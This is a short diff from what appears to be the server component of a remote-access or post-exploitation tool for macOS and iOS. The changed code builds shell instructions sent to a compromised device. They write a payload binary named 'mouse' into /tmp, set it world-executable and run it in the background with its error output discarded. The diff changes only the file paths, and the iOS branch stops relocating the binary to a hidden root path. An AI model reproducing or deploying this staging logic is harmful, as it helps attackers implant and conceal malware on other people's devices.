@@ -112,9 +112,9 @@ class Server:
             f.close()
             #save to tmp, 
             instructions = \
-            "cat >/private/tmp/mouse;"+\
-            "chmod 777 /private/tmp/mouse;"+\
-            "/private/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
+            "cat >/tmp/mouse;"+\
+            "chmod 777 /tmp/mouse;"+\
+            "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         elif device_arch in self.ios_architectures:
             self.verbose_print("Detected iOS")
@@ -122,10 +122,9 @@ class Server:
             payload = f.read()
             f.close()
             instructions = \
-            "cat >/tmp/tmpm;"+\
-            "chmod 777 /tmp/tmpm;"+\
-            "mv /tmp/mouse /.mouse;"+\
-            "/.mouse "+payload_parameter+" 2>/dev/null &\n"
+            "cat >/tmp/mouse;"+\
+            "chmod 777 /tmp/mouse;"+\
+            "/tmp/mouse "+payload_parameter+" 2>/dev/null &\n"
             return (instructions,payload)
         else:
             h.info_error("The device is not recognized!")
